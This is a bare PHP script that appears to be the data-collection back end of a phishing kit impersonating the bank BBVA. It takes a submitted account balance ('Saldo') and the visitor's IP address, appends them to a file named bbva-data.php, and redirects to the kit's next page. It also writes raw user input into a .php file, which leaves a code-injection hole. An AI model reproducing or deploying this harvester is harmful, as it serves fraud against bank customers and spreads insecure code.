<?php

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'];
}

if (!empty($_POST["dhfhd"])) {

    $ab = $_POST['dhfhd'];

    file_put_contents("bbva-data.php", "<br>Saldo: " . $ab . "\n", FILE_APPEND);
    file_put_contents("bbva-data.php", "<br>\n", FILE_APPEND);
    file_put_contents("bbva-data.php", "<br>IP: " . $ipaddress . "\n", FILE_APPEND);
    file_put_contents("bbva-data.php", "<br>------------------------------\n", FILE_APPEND);
    header('location: dc.html');
} else {
    header('location: index.html');
    exit();
}
?>